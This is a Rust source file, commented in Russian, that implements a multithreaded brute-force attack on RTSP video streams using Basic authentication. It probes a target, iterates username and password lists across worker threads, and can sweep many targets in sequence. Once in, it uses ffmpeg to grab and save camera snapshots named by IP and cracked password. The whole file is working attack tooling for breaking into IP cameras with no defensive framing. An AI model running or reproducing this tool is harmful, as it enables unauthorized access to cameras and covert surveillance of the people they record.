use std::collections::VecDeque;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use base64::prelude::*;
use std::fs;
use std::process::Command;



// Конфигурация
#[derive(Clone)]
pub struct Config {
    pub target_ip: String,
    pub target_port: u16,
    pub threads: usize,
    pub thread_block_size: usize,
    pub sleep_time: u64,
}


// Результаты
#[derive(Debug, Clone)]
pub struct AuthResult {
    pub username: String,
    pub password: String,
    pub response: String,
}

// Тип для функции создания пакетов
type PacketCreator = fn(&str, &str, &str) -> String;

// Создание тестового пакета
fn create_test_packet(ip: &str) -> String {
    format!(
        "DESCRIBE rtsp://{} RTSP/1.0\r\nCSeq: 2\r\n\r\n",
        ip
    )
}

// Создание пакета с Basic аутентификацией
fn create_basic_packet(ip: &str, username: &str, password: &str) -> String {
    let credentials = format!("{}:{}", username, password);
    let encoded_credentials = BASE64_STANDARD.encode(credentials);
    
    format!(
        "DESCRIBE rtsp://{} RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {}\r\n\r\n",
        ip, encoded_credentials
    )
}

// Проверка ответов
fn is_unauthorized(response: &str) -> bool {
    response.contains("401 Unauthorized")
}

fn is_authorized(response: &str) -> bool {
    response.contains("200 OK")
}

fn use_basic_auth(response: &str) -> bool {
    response.contains("WWW-Authenticate: Basic")
}

// Улучшенная функция для чтения ответа с повторными попытками
fn read_response(stream: &mut TcpStream) -> std::io::Result<String> {
    let mut response = Vec::new();
    let mut buffer = [0u8; 1024];
    let start_time = std::time::Instant::now();
    let timeout = Duration::from_secs(5);
    
    loop {
        match stream.read(&mut buffer) {
            Ok(0) => break, // Connection closed
            Ok(n) => {
                response.extend_from_slice(&buffer[..n]);
                
                // Проверяем, получили ли мы полный ответ (RTSP ответ заканчивается двойным CRLF)
                let response_str = String::from_utf8_lossy(&response);
                if response_str.contains("\r\n\r\n") {
                    break;
                }
                
                // Если ответ слишком большой, выходим
                if response.len() > 8192 {
                    break;
                }
            }
            Err(e) => {
                if e.kind() == std::io::ErrorKind::WouldBlock {
                    // Данные временно недоступны, ждем
                    if start_time.elapsed() > timeout {
                        return Err(std::io::Error::new(
                            std::io::ErrorKind::TimedOut,
                            "Read timeout"
                        ));
                    }
                    thread::sleep(Duration::from_millis(10));
                    continue;
                } else if e.kind() == std::io::ErrorKind::Interrupted {
                    // Прервано, продолжаем
                    continue;
                } else {
                    return Err(e);
                }
            }
        }
        
        // Проверяем таймаут
        if start_time.elapsed() > timeout {
            return Err(std::io::Error::new(
                std::io::ErrorKind::TimedOut,
                "Read timeout"
            ));
        }
        
        // Короткая пауза перед следующей попыткой чтения
        thread::sleep(Duration::from_millis(5));
    }
    
    Ok(String::from_utf8_lossy(&response).to_string())
}

// Рабочий поток
fn auth_worker(
    config: Config,
    work_queue: Arc<Mutex<VecDeque<(String, String)>>>,
    results: Arc<Mutex<Vec<AuthResult>>>,
    packet_creator: PacketCreator,
    worker_id: usize,
) {
    while let Some((username, password)) = {
        let mut queue = work_queue.lock().unwrap();
        queue.pop_front()
    } {
        // Пропускаем пустые учетные данные
        if username.is_empty() || password.is_empty() {
            continue;
        }

        // Создаем новое соединение для каждой попытки
        match TcpStream::connect(format!("{}:{}", config.target_ip, config.target_port)) {
            Ok(mut stream) => {
                // Устанавливаем таймауты
                if let Err(e) = stream.set_read_timeout(Some(Duration::from_secs(8))) {
                    eprintln!("[Worker {}] Set read timeout error: {}", worker_id, e);
                    continue;
                }
                
                if let Err(e) = stream.set_write_timeout(Some(Duration::from_secs(8))) {
                    eprintln!("[Worker {}] Set write timeout error: {}", worker_id, e);
                    continue;
                }

                let packet = packet_creator(&config.target_ip, &username, &password);
                
                // Отправляем пакет
                if let Err(e) = stream.write_all(packet.as_bytes()) {
                    eprintln!("[Worker {}] Write error: {}", worker_id, e);
                    continue;
                }

                // Читаем ответ с улучшенной обработкой
                match read_response(&mut stream) {
                    Ok(response) => {
                        if is_authorized(&response) {
                            println!("[Worker {}] Found valid credentials: {}:{}", worker_id, username, password);
                            
                            let result = AuthResult {
                                username: username.clone(),
                                password: password.clone(),
                                response: response.clone(),
                            };
                            
                            results.lock().unwrap().push(result);
                        }
                    }
                    Err(e) => {
                        if e.kind() != std::io::ErrorKind::TimedOut {
                            eprintln!("[Worker {}] Read error: {}", worker_id, e);
                        }
                    }
                }
            }
            Err(e) => {
                eprintln!("[Worker {}] Connection failed: {}", worker_id, e);
            }
        }
        
        // Небольшая пауза чтобы не перегружать целевой сервер
        thread::sleep(Duration::from_millis(50));
    }
}

pub fn brute_force_target(
    target_ip: String,
    target_port: u16,
    usernames: Vec<String>,
    passwords: Vec<String>,
    threads: usize,
) -> Vec<AuthResult> {
    let config = Config {
        target_ip,
        target_port,
        threads,
        thread_block_size: 100,
        sleep_time: 5,
    };
    
    // Сначала тестируем соединение
    println!("[*] Testing connection to {}:{}", config.target_ip, config.target_port);
    
    let auth_method = match TcpStream::connect(format!("{}:{}", config.target_ip, config.target_port)) {
        Ok(mut stream) => {
            let test_packet = create_test_packet(&config.target_ip);
            
            if let Err(e) = stream.set_read_timeout(Some(Duration::from_secs(8))) {
                eprintln!("[-] Failed to set read timeout: {}", e);
                return Vec::new();
            }
            
            if let Err(e) = stream.set_write_timeout(Some(Duration::from_secs(8))) {
                eprintln!("[-] Failed to set write timeout: {}", e);
                return Vec::new();
            }
            
            if let Err(e) = stream.write_all(test_packet.as_bytes()) {
                eprintln!("[-] Failed to send test packet: {}", e);
                return Vec::new();
            }
            
            match read_response(&mut stream) {
                Ok(response) => {
                    println!("[*] Server response: {}", 
                        if response.len() > 100 { 
                            format!("{}...", &response[..100]) 
                        } else { 
                            response.clone() 
                        }
                    );
                    
                    if is_unauthorized(&response) {
                        if use_basic_auth(&response) {
                            println!("[*] Basic authentication detected, starting brute force...");
                            Some(create_basic_packet as PacketCreator)
                        } else {
                            println!("[-] Unsupported authentication method (only Basic auth supported)");
                            None
                        }
                    } else if is_authorized(&response) {
                        println!("[!] Service allows unauthorized access - no authentication required");

                        // 🔥 ГЛАВНАЯ ПРАВКА:
                        // сразу возвращаем спец-результат и НЕ запускаем брутфорс
                        return vec![
                            AuthResult {
                                // можешь тут поставить "<none>" или что тебе удобнее
                                username: String::new(),
                                password: String::new(),
                                response, // сюда переезжает полный ответ сервера
                            }
                        ];
                    } else {
                        println!("[-] Unexpected server response");
                        None
                    }
                }
                Err(e) => {
                    eprintln!("[-] Failed to read test response: {}", e);
                    None
                }
            }
        }
        Err(e) => {
            eprintln!("[-] Failed to connect to target: {}", e);
            None
        }
    };
    
    if let Some(packet_creator) = auth_method {
        start_brute_force(config, usernames, passwords, packet_creator)
    } else {
        Vec::new()
    }
}

// Запуск брутфорса
fn start_brute_force(
    config: Config,
    usernames: Vec<String>,
    passwords: Vec<String>,
    packet_creator: PacketCreator,
) -> Vec<AuthResult> {
    let work_queue = Arc::new(Mutex::new(VecDeque::new()));
    let results = Arc::new(Mutex::new(Vec::new()));
    
    // Заполняем очередь
    let total_combinations: usize = {
        let mut queue = work_queue.lock().unwrap();
        let mut count = 0;
        for username in &usernames {
            for password in &passwords {
                if !username.is_empty() && !password.is_empty() {
                    queue.push_back((username.clone(), password.clone()));
                    count += 1;
                }
            }
        }
        count
    };
    
    if total_combinations == 0 {
        println!("[-] No valid username/password combinations to test");
        return Vec::new();
    }
    
    println!("[*] Starting brute force with {} combinations", total_combinations);
    
    let mut handles = vec![];
    
    for i in 0..config.threads {
        let config_clone = config.clone();
        let work_queue_clone = Arc::clone(&work_queue);
        let results_clone = Arc::clone(&results);
        
        let handle = thread::spawn(move || {
            auth_worker(
                config_clone,
                work_queue_clone,
                results_clone,
                packet_creator,
                i,
            );
        });
        
        handles.push(handle);
    }
    
    // 🔥 здесь будет копиться всё, что нашли
    let mut all_found_results: Vec<AuthResult> = Vec::new();

    // Мониторинг прогресса
    let start_time = std::time::Instant::now();
    let mut last_completed = 0;
    
    loop {
        thread::sleep(Duration::from_secs(config.sleep_time));
        
        let remaining = work_queue.lock().unwrap().len();
        let completed = total_combinations.saturating_sub(remaining);
        
        if completed != last_completed {
            let elapsed = start_time.elapsed().as_secs();
            let rate = if elapsed > 0 { completed as f64 / elapsed as f64 } else { 0.0 };
            let eta = if rate > 0.0 && remaining > 0 { 
                remaining as f64 / rate 
            } else { 
                0.0 
            };
            
            println!(
                "[Progress] {}/{} ({:.1}%) - Rate: {:.1}/s - ETA: {:.0}s",
                completed,
                total_combinations,
                (completed as f64 / total_combinations as f64) * 100.0,
                rate,
                eta
            );
            
            last_completed = completed;
        }
        
        // Забираем новые результаты
        let found_results: Vec<AuthResult> = {
            let mut results_lock = results.lock().unwrap();
            results_lock.drain(..).collect()
        };
        
        // Добавляем их к общему списку, который вернём в конце
        if !found_results.is_empty() {
            all_found_results.extend(found_results.iter().cloned());
        }

        // Логи как были
        for result in &found_results {
            println!("\n[SUCCESS] Found valid credentials!");
            println!("Username: {}", result.username);
            println!("Password: {}", result.password);
            println!(
                "Response: {}",
                if result.response.len() > 200 {
                    format!("{}...", &result.response[..200])
                } else {
                    result.response.clone()
                }
            );
            println!("{}", "=".repeat(50));
        }
        
        if remaining == 0 {
            break;
        }
        
        let all_done = {
            let queue = work_queue.lock().unwrap();
            queue.is_empty()
        };
        
        if all_done {
            break;
        }
    }
    
    for handle in handles {
        let _ = handle.join();
    }
    
    println!("[*] Brute force completed");
    
    // ❗ Возвращаем именно накопленный список
    all_found_results
}

// Функция для массового брутфорса нескольких целей
pub fn brute_force_multiple_targets(
    targets: Vec<(String, u16)>,
    usernames: Vec<String>,
    passwords: Vec<String>,
    threads_per_target: usize,
) -> Vec<(String, u16, Vec<AuthResult>)> {
    let mut all_results = Vec::new();
    
    for (target_ip, target_port) in targets {
        println!("\n{}", "=".repeat(60));
        println!("Starting brute force for {}:{}", target_ip, target_port);
        println!("{}", "=".repeat(60));
        
        let results = brute_force_target(
            target_ip.clone(),
            target_port,
            usernames.clone(),
            passwords.clone(),
            threads_per_target,
        );
        
        all_results.push((target_ip, target_port, results));
    }
    
    all_results
}

pub fn capture_snapshot_rtsp(
    target_ip: String,
    target_port: u16,
    username: &str,
    password: &str,
) -> std::io::Result<()> {


        
    let snapshot_output_dir = "snapshots".to_string();
    let path_s = "/".to_string();
        
    // rtsp://user:pass@ip:port/path
    let path = path_s.trim_start_matches('/');
    let url = if username.is_empty() && password.is_empty() {
        // если вдруг нашли "no auth", то без кредов
        format!("rtsp://{}:{}/{}", target_ip, target_port, path)
    } else {
        format!(
            "rtsp://{}:{}@{}:{}/{}",
            username,
            password,
            target_ip,
            target_port,
            path
        )
    };

    fs::create_dir_all(&snapshot_output_dir)?;

    let safe_user = if username.is_empty() { "noauth" } else { username };
    let safe_pass = if password.is_empty() { "noauth" } else { password };
    let filename = format!(
        "{}/{}_{}_{}_{}.jpg",
        snapshot_output_dir,
        target_ip,
        target_port,
        safe_user,
        safe_pass
    );

    println!("[*] Trying to capture RTSP snapshot from {url} -> {filename}");

    // ffmpeg -rtsp_transport tcp -y -i <url> -frames:v 1 <file>
    let status = Command::new("ffmpeg")
        .arg("-y") 
        .arg("-i")
        .arg(&url)
        .arg("-ss")
        .arg("1")
        .arg("-vframes")
        .arg("1")
        .arg(&filename)
        .status()?;

    if !status.success() {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("ffmpeg exited with status {status:?}"),
        ));
    }

    println!("[+] RTSP snapshot saved to {}", filename);
    Ok(())
}
